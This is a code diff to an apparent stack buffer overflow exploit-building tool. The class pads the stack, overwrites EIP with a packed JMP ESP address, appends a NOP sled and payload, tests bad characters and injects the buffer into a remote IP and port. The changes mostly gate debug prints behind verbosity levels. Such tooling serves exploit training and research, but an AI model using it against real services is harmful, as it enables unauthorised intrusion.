@@ -36,7 +36,9 @@ class Classic:
 
     def fill_classic(self, offset):
 
-        # print("[+] Filling stack at " + str(offset))
+        if (self.config.verbose_lv >= 1):
+            print("[+] Filling stack at " + str(offset))
+
         offset = "A" * offset
         self.eip = "B" * 4
         self.esp = "C" * 400
@@ -70,7 +72,8 @@ class Classic:
         self.buffer = offset + self.eip + self.esp
         self.buffer += b"\r\n"
 
-        print(type(self.esp))
+        # if(self.config.verbose_lv == 2):
+        #     print(type(self.esp))
 
         return self.buffer
 
@@ -87,8 +90,11 @@ class Classic:
 
         self.eip = pack('<L', int("0x" + str(jmp_esp), 16))
 
-        print(self.buffer)
-        print(type(self.buffer))
+        if (self.config.verbose_lv >= 1):
+            print(self.buffer)
+
+        if (self.config.verbose_lv == 2):
+            print(type(self.buffer))
 
         if (sys.version_info >= (3, 0)):
             self.esp = payload #.encode('latin-1')
@@ -98,8 +104,9 @@ class Classic:
         self.buffer = offset + self.eip
 
         if nops > 0 or nops != None:
-            print("\x90" * nops)
-            print(type(("\x90" * nops)))
+            if (self.config.verbose_lv == 2):
+                print("\x90" * nops)
+                print(type(("\x90" * nops)))
 
             if (sys.version_info >= (3, 0)):
                 _nops = ("\x90" * nops).encode('latin-1')
@@ -109,14 +116,14 @@ class Classic:
 
             self.buffer += _nops
 
-        print(self.buffer)
-        print(type(self.buffer))
-
         self.buffer += self.esp
         #self.buffer += "\r\n"
 
-        print(self.buffer)
-        print(type(self.buffer))
+        if (self.config.verbose_lv >= 1):
+            print(self.buffer)
+
+        if (self.config.verbose_lv == 2):
+            print(type(self.buffer))
 
         # self.show_stack(self.config)
 
@@ -150,7 +157,9 @@ class Classic:
         System.file_write(filename, buffer)
 
         print("[+] Buffer is aligned in EIP and saved to %s" % filename)
-        print(buffer)
+
+        if (self.config.verbose_lv >= 1):
+            print(buffer)
 
         self.jmpesp_add = System.input("[?] Inform JMP ESP address :")
 
@@ -202,6 +211,8 @@ class Classic:
 
             if(self.config.offset < 2 or self.config.offset == ""):
                 System.generic_fuzzer(self.config)
+            else:
+                print("[!] Got from session OFFSET " + str(self.config.offset))
 
             # _offset = System.input("[?] Press ENTER if you wanna fuzz the application or input the offset to skip this:")
             #
@@ -242,9 +253,12 @@ class Classic:
             # if self.config.offset < 2:
             #     gonext = "n"
             #     while gonext == "n":
+
             buffer = self.fill_classic(self.config.offset)
             # gonext = System.input("[?] Buffer is aligned in EIP: [Y]es/[N]o?")
-            print(buffer)
+
+            if (self.config.verbose_lv >= 1):
+                print(buffer)
 
             #########################################################
             # GET JMP ADDRESS
@@ -294,7 +308,7 @@ class Classic:
                 self.config.badchars = System.badchars
 
             print ("[+] Badchars detected : " + ",".join(self.config.badchars))
-            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip]")
+            gonext = System.input("[?] Do you want to test or add custom badchars? [T]est/[A]dd/[S]kip:")
 
             if(gonext == "T"):
                 exploit = self.fill_classic_bytearray(self.config.offset, self.config.jmpesp_add)
@@ -303,7 +317,7 @@ class Classic:
                 inject_func(self.config.remoteip, self.config.remoteport, self.config.field, exploit, True)
 
             if(gonext != "S"):
-                bads = System.input("Additional Badchars? Separate multiple HEX (without 0x) by commas: ")
+                bads = System.input("Additional Badchars? Separate multiple HEX (without 0x) by commas:")
 
                 if ',' in bads:
                     _bads = bads.split(',')
